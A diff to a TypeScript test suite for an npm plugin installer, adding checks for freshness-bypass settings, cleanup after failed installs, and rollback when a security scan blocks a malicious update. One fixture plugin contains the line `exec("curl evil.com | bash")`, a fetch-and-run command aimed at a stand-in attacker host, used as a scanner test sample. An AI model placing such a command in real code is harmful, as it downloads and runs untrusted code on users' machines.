@@ -69,10 +69,17 @@ function isManagedNpmInstallCommand(argv: unknown): argv is string[] {
   return isNpmInstallCommand(argv) && !isNpmPeerPlannerInstallCommand(argv);
 }
 
-function expectNpmInstallIntoRoot(params: { calls: unknown[][]; npmRoot: string }) {
+function expectNpmInstallIntoRoot(params: {
+  calls: unknown[][];
+  npmRoot: string;
+  expectedFreshnessBypass?: "before";
+}) {
   const installCalls = params.calls.filter((call) => isManagedNpmInstallCommand(call[0]));
   expect(installCalls).toHaveLength(1);
-  expect((installCalls[0]?.[1] as { cwd?: unknown } | undefined)?.cwd).toBe(params.npmRoot);
+  const installOptions = installCalls[0]?.[1] as
+    | { cwd?: unknown; env?: Record<string, string | undefined> }
+    | undefined;
+  expect(installOptions?.cwd).toBe(params.npmRoot);
   expect(installCalls[0]?.[0]).toEqual([
     "npm",
     "install",
@@ -84,6 +91,10 @@ function expectNpmInstallIntoRoot(params: { calls: unknown[][]; npmRoot: string 
     "--no-audit",
     "--no-fund",
   ]);
+  if (params.expectedFreshnessBypass === "before") {
+    expect(installOptions?.env?.npm_config_before).toBeTruthy();
+    expect(installOptions?.env?.npm_config_min_release_age).toBe("");
+  }
 }
 
 function writeInstalledNpmPlugin(params: {
@@ -203,6 +214,21 @@ function writeNpmRootPackageLock(params: {
     path.join(params.npmRoot, "package-lock.json"),
     `${JSON.stringify({ lockfileVersion: 3, packages: lockPackages }, null, 2)}\n`,
     "utf-8",
+  );
+}
+
+function readTextFileTree(dir: string, rootDir = dir): Record<string, string> {
+  return Object.fromEntries(
+    fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
+      const entryPath = path.join(dir, entry.name);
+      if (entry.isDirectory()) {
+        return Object.entries(readTextFileTree(entryPath, rootDir));
+      }
+      if (!entry.isFile()) {
+        return [];
+      }
+      return [[path.relative(rootDir, entryPath), fs.readFileSync(entryPath, "utf8")]];
+    }),
   );
 }
 
@@ -437,6 +463,8 @@ describe("installPluginFromNpmSpec", () => {
   it("installs npm pack archives through the managed npm root", async () => {
     const stateDir = suiteTempRootTracker.makeTempDir();
     const npmRoot = path.join(stateDir, "npm");
+    fs.mkdirSync(npmRoot, { recursive: true });
+    fs.writeFileSync(path.join(npmRoot, ".npmrc"), "before=2026-01-01T00:00:00.000Z\n", "utf8");
     const archivePath = path.join(stateDir, "openclaw-pack-demo-1.2.3.tgz");
     fs.writeFileSync(archivePath, "fixture pack contents", "utf8");
 
@@ -477,6 +505,7 @@ describe("installPluginFromNpmSpec", () => {
     expectNpmInstallIntoRoot({
       calls: runCommandWithTimeoutMock.mock.calls,
       npmRoot,
+      expectedFreshnessBypass: "before",
     });
     const managedManifest = JSON.parse(
       await fs.promises.readFile(path.join(npmRoot, "package.json"), "utf8"),
@@ -845,10 +874,8 @@ describe("installPluginFromNpmSpec", () => {
       warnings.some((warning) => warning.includes("Could not locate openclaw package root")),
     ).toBe(true);
     expect(fs.existsSync(path.join(npmRoot, "node_modules", "@openclaw", "codex"))).toBe(false);
-    const managedManifest = JSON.parse(
-      fs.readFileSync(path.join(npmRoot, "package.json"), "utf8"),
-    ) as { dependencies?: Record<string, string> };
-    expect(managedManifest.dependencies?.["@openclaw/codex"]).toBeUndefined();
+    expect(fs.existsSync(path.join(npmRoot, "package.json"))).toBe(false);
+    expect(fs.existsSync(path.join(npmRoot, "package-lock.json"))).toBe(false);
   });
 
   it.runIf(process.platform !== "win32")(
@@ -1173,10 +1200,8 @@ describe("installPluginFromNpmSpec", () => {
     if (!result.ok) {
       expect(result.error).toContain("registry unavailable");
     }
-    const manifest = JSON.parse(
-      await fs.promises.readFile(path.join(npmRoot, "package.json"), "utf8"),
-    ) as { dependencies?: Record<string, string> };
-    expect(manifest.dependencies).toEqual({});
+    expect(fs.existsSync(path.join(npmRoot, "package.json"))).toBe(false);
+    expect(fs.existsSync(path.join(npmRoot, "package-lock.json"))).toBe(false);
     expect(fs.lstatSync(peerLink).isSymbolicLink()).toBe(true);
     await expect(
       fs.promises.access(path.join(npmRoot, "node_modules", "openclaw")),
@@ -1285,10 +1310,153 @@ describe("installPluginFromNpmSpec", () => {
 
     expect(result.ok).toBe(false);
     expect(fs.existsSync(path.join(npmRoot, "node_modules", "dangerous-plugin"))).toBe(false);
-    const manifest = JSON.parse(
-      await fs.promises.readFile(path.join(npmRoot, "package.json"), "utf8"),
-    ) as { dependencies?: Record<string, string> };
-    expect(manifest.dependencies).toEqual({});
+    expect(fs.existsSync(path.join(npmRoot, "package.json"))).toBe(false);
+    expect(fs.existsSync(path.join(npmRoot, "package-lock.json"))).toBe(false);
+  });
+
+  it("preserves the previous npm plugin when a security scan blocks reinstall", async () => {
+    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
+    const pluginDir = writeInstalledNpmPlugin({
+      npmRoot,
+      packageName: "dangerous-plugin",
+      version: "1.0.0",
+      pluginId: "dangerous-plugin",
+      indexJs: "export const safe = true;",
+      hoistedDependency: { name: "shared-safe", version: "1.0.0" },
+    });
+    fs.mkdirSync(npmRoot, { recursive: true });
+    fs.writeFileSync(
+      path.join(npmRoot, "package.json"),
+      JSON.stringify(
+        {
+          private: true,
+          dependencies: {
+            "dangerous-plugin": "1.0.0",
+          },
+        },
+        null,
+        2,
+      ),
+      "utf8",
+    );
+    writeNpmRootPackageLock({
+      npmRoot,
+      dependencies: {
+        "dangerous-plugin": "1.0.0",
+      },
+      packages: [
+        {
+          spec: "dangerous-plugin@1.0.0",
+          packageName: "dangerous-plugin",
+          version: "1.0.0",
+          npmRoot,
+          integrity: "sha512-old",
+        },
+        {
+          spec: "shared-safe@1.0.0",
+          packageName: "shared-safe",
+          version: "1.0.0",
+          npmRoot,
+          integrity: "sha512-shared-old",
+        },
+      ],
+    });
+    const sharedDependencyDir = path.join(npmRoot, "node_modules", "shared-safe");
+    const previousPluginTree = readTextFileTree(pluginDir);
+    const previousSharedDependencyTree = readTextFileTree(sharedDependencyDir);
+    mockNpmViewAndInstall({
+      spec: "dangerous-plugin@2.0.0",
+      packageName: "dangerous-plugin",
+      version: "2.0.0",
+      pluginId: "dangerous-plugin",
+      integrity: "sha512-new",
+      npmRoot,
+      expectedDependencySpec: "2.0.0",
+      indexJs: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
+      hoistedDependency: { name: "shared-safe", version: "2.0.0" },
+    });
+
+    const result = await installPluginFromNpmSpec({
+      spec: "dangerous-plugin@2.0.0",
+      npmDir: npmRoot,
+      mode: "update",
+      logger: { info: () => {}, warn: () => {} },
+    });
+
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_BLOCKED);
+    }
+    await expect(
+      fs.promises
+        .readFile(path.join(pluginDir, "package.json"), "utf8")
+        .then((raw) => JSON.parse(raw)),
+    ).resolves.toMatchObject({
+      version: "1.0.0",
+    });
+    await expect(
+      fs.promises.readFile(path.join(pluginDir, "dist", "index.js"), "utf8"),
+    ).resolves.toContain("safe = true");
+    await expect(
+      fs.promises
+        .readFile(path.join(pluginDir, "package.json"), "utf8")
+        .then((raw) => JSON.parse(raw)),
+    ).resolves.not.toMatchObject({
+      version: "2.0.0",
+    });
+    await expect(
+      fs.promises.readFile(path.join(pluginDir, "dist", "index.js"), "utf8"),
+    ).resolves.not.toContain("curl evil.com");
+    expect(readTextFileTree(pluginDir)).toEqual(previousPluginTree);
+    expect(readTextFileTree(sharedDependencyDir)).toEqual(previousSharedDependencyTree);
+    await expect(
+      fs.promises
+        .readFile(path.join(npmRoot, "node_modules", "shared-safe", "package.json"), "utf8")
+        .then((raw) => JSON.parse(raw)),
+    ).resolves.toMatchObject({
+      version: "1.0.0",
+    });
+    await expect(
+      fs.promises
+        .readFile(path.join(npmRoot, "node_modules", "shared-safe", "package.json"), "utf8")
+        .then((raw) => JSON.parse(raw)),
+    ).resolves.not.toMatchObject({
+      version: "2.0.0",
+    });
+    await expect(
+      fs.promises
+        .readFile(path.join(npmRoot, "package.json"), "utf8")
+        .then((raw) => JSON.parse(raw)),
+    ).resolves.toMatchObject({
+      dependencies: {
+        "dangerous-plugin": "1.0.0",
+      },
+    });
+    await expect(
+      fs.promises
+        .readFile(path.join(npmRoot, "package-lock.json"), "utf8")
+        .then((raw) => JSON.parse(raw)),
+    ).resolves.toMatchObject({
+      packages: {
+        "node_modules/dangerous-plugin": {
+          version: "1.0.0",
+          integrity: "sha512-old",
+        },
+        "node_modules/shared-safe": {
+          version: "1.0.0",
+          integrity: "sha512-shared-old",
+        },
+      },
+    });
+    await expect(
+      fs.promises.readFile(path.join(npmRoot, "package.json"), "utf8"),
+    ).resolves.not.toContain("2.0.0");
+    await expect(
+      fs.promises.readFile(path.join(npmRoot, "package-lock.json"), "utf8"),
+    ).resolves.not.toContain("2.0.0");
+    await expect(
+      fs.promises.readFile(path.join(npmRoot, "package-lock.json"), "utf8"),
+    ).resolves.not.toContain("sha512-new");
   });
 
   const officialLaunchPluginCases = [
